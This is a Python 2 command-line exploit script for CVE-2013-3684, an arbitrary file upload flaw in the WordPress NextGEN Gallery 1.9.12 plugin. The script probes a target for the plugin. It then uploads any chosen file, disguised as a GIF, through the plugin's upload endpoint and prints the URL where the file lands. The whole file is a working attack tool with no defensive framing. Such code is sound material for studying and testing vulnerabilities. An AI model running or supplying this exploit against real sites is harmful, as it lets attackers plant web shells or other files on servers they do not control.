#!/usr/bin/python
# -*- coding: utf-8 -*-
import httplib, mimetypes,urllib2


def exists(url):
	try:
		r = urllib2.urlopen(url)
	except urllib2.URLError as e:
        	r = e
	return r.code == 200

def post_multipart(host, uri, fields, files):
    content_type, body = encode_multipart_formdata(fields, files)
    h = httplib.HTTPConnection(host)
    headers = {
        'User-Agent': 'INSERT USERAGENTNAME',
        'Content-Type': content_type
        }
    h.request('POST', uri, body, headers)
    res = h.getresponse()
    return res.status, res.reason, res.read() 

def encode_multipart_formdata(fields, files):
    """
    fields is a sequence of (name, value) elements for regular form fields.
    files is a sequence of (name, filename, value) elements for data to be uploaded as files
    Return (content_type, body) ready for httplib.HTTP instance
    """
    BOUNDARY = '----------bound@ry_$'
    CRLF = '\r\n'
    L = []
    for (key, value) in fields:
        L.append('--' + BOUNDARY)
        L.append('Content-Disposition: form-data; name="%s"' % key)
        L.append('')
        L.append(value)
    for (key, filename, value) in files:
        L.append('--' + BOUNDARY)
        L.append('Content-Disposition: form-data; name="%s"; filename="%s"' % (key, filename))
        L.append('Content-Type: image/gif')
        L.append('')
        L.append(value)
    L.append('--' + BOUNDARY + '--')
    L.append('')
    body = CRLF.join(L)
    content_type = 'multipart/form-data; boundary=%s' % BOUNDARY
    return content_type, body


if __name__ == '__main__':
	import argparse
	parser = argparse.ArgumentParser(__file__)
	parser = argparse.ArgumentParser(description="NextGEN Gallery 1.9.12 Arbitrary File Upload (CVE-2013-3684)")
	parser.add_argument('-i','--ip', help='IP address or host name', required=True)
	parser.add_argument('-u','--uri', help='URI path /wordpress', required=True)
	parser.add_argument('-f','--file', help='File to upload', required=True)
	args = vars(parser.parse_args())
	
	if args['ip']!=None and args['uri']!=None:
		uriPath = 'http://'+args['ip']+args['uri']+'/wp-content/plugins/nextgen-gallery/'
		if(exists(uriPath)):
			print "[*] Wordpress Plugin: NextGEN Gallery found"
			
			f = open(args['file'],"r")
			inputData = f.read()
			f.close() 

			data = [('name','name'),('galleryselect','1')]
			file = [('Filedata','file1.gif',inputData)]
			if "?p=1&nggupload=" not in args['uri']:
				uri = args['uri']+"/?p=1&nggupload="
			else: 
				uri = args['uri']
			response = post_multipart(args['ip'],uri,data,file)
			if response[0]==200:
				print "[*] File has been uploaded successfully. Please check the below location\n"
				print "******************************************************************************"
				print "http://"+args['ip']+uri.strip("?p=1&nggupload=")+"wp-content/[gallery_name]/file1.gif"
				print "******************************************************************************"
		else:
			print "[*] Wordpress Plugin: NextGEN Gallery NOT found"

